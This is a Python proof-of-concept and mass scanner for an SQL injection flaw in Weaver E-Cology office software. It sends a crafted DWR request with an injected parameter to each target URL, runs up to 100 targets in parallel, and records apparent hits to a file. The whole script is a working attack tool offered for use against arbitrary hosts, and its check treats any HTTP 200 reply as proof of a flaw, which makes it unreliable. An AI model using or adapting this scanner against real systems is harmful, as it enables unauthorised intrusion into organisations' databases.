#泛微 E-Cology某版本SQL注入漏洞
#导包外置
import requests,argparse,sys
from multiprocessing.dummy import Pool
# 关闭告警
requests.packages.urllib3.disable_warnings()

def banner():
    test = """ ________        ______             __                               
|        \      /      \           |  \                              
| $$$$$$$$     |  $$$$$$\  ______  | $$  ______    ______   __    __ 
| $$__  ______ | $$   \$$ /      \ | $$ /      \  /      \ |  \  |  \
| $$  \|      \| $$      |  $$$$$$\| $$|  $$$$$$\|  $$$$$$\| $$  | $$
| $$$$$ \$$$$$$| $$   __ | $$  | $$| $$| $$  | $$| $$  | $$| $$  | $$
| $$_____      | $$__/  \| $$__/ $$| $$| $$__/ $$| $$__| $$| $$__/ $$
| $$     \      \$$    $$ \$$    $$| $$ \$$    $$ \$$    $$ \$$    $$
 \$$$$$$$$       \$$$$$$   \$$$$$$  \$$  \$$$$$$  _\$$$$$$$ _\$$$$$$$
                                                 |  \__| $$|  \__| $$
                                                  \$$    $$ \$$    $$
                                                   \$$$$$$   \$$$$$$ 
                                                                    author:CHKer
                                                                    version:1.0.0
"""
    print(test)

def main():
    banner()
    parser = argparse.ArgumentParser(description="泛微 E-Cology某版本SQL注入漏洞")
    parser.add_argument('-u', '--url', dest='url', type=str, help=' input your url')
    parser.add_argument('-f', '--file', dest='file', type=str, help='input your file path')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n', ''))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python {sys.argv[0]} -h")

def poc(target):
    payload = '/dwr/call/plaincall/CptDwrUtil.ifNewsCheckOutByCurrentUser.dwr'
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2117.157 Safari/537.36',
        'Connection': 'close',
        'Content-Length': '189',
        'Content-Type': 'text/plain',
        'Accept-Encoding': 'gzip'
    }
    proxies = {
        'http':'http://127.0.0.1:8080',
        'https':'http://127.0.0.1:8080'
    }
    data = """callCount=1
page=
httpSessionId=
scriptSessionId=
c0-scriptName=DocDwrUtil
c0-methodName=ifNewsCheckOutByCurrentUser
c0-id=0
c0-param0=string:1 AND 1=1
c0-param1=string:1
batchId=0"""
    try:
        res1 = requests.post(url=target+payload,timeout=10,headers=headers,data=data,verify=False,proxies=proxies)
        if res1.status_code == 200:
            print(f"[+]该url:{target}sql注入漏洞")
            with open('result16.txt','a', encoding='utf-8') as fp:
                fp.write(f"{target}"+"\n")
        else:
            print(f'[-]该url:{target}不存在sql注入漏洞')
    except:
        print(f'[-]该url:{target}该站点存在问题')

if __name__ == '__main__':
    main()